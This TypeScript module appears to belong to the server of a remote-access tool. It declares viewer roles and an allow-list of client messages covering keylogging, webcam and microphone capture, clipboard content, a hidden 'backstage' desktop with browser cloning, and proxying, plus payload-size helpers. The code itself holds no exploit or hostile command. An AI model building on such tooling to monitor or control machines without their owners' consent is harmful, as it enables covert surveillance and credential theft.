export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "backstage_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "voice_viewer" | "desktop_audio_viewer" | "notifications_viewer";

const textEncoder = new TextEncoder();

export const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
  "hello",
  "ping",
  "pong",
  "frame",
  "status",
  "console_output",
  "file_list_result",
  "file_download",
  "file_upload_result",
  "file_read_result",
  "file_search_result",
  "file_icon_result",
  "file_thumb_result",
  "file_dirsize_result",
  "file_peek_result",
  "file_hash_result",
  "command_result",
  "desktop_encoder_capabilities",
  "desktop_stream_stats",
  "desktop_cursor",
  "client_logs_result",
  "screenshot_result",
  "command_progress",
  "process_list_result",
  "process_icon_result",
  "script_result",
  "plugin_event",
  "notification",
  "keylog_file_list",
  "keylog_file_content",
  "keylog_clear_result",
  "keylog_delete_result",
  "keylog_permission_result",
  "voice_uplink",
  "desktop_audio_uplink",
  "webcam_devices",
  "backstage_clone_progress",
  "backstage_lookup_result",
  "backstage_browser_check_result",
  "backstage_installed_apps_result",
  "backstage_dxgi_status",
  "backstage_browser_launch_status",
  "backstage_window_list_result",
  "clipboard_content",
  "proxy_data",
  "proxy_close",
  "disconnect_info",
  "webrtc_p2p_answer",
  "webrtc_p2p_ice",
]);

export function isAllowedClientMessageType(type: string): boolean {
  return ALLOWED_CLIENT_MESSAGE_TYPES.has(type);
}

export function getMessageByteLength(
  message: string | ArrayBuffer | Uint8Array,
): number {
  if (typeof message === "string") {
    return textEncoder.encode(message).length;
  }
  if (message instanceof ArrayBuffer) {
    return message.byteLength;
  }
  return message.byteLength;
}

export function getMaxPayloadLimit(
  role: SocketRole | undefined,
  clientLimit: number,
  viewerLimit: number,
): number {
  return role === "client" ? clientLimit : viewerLimit;
}
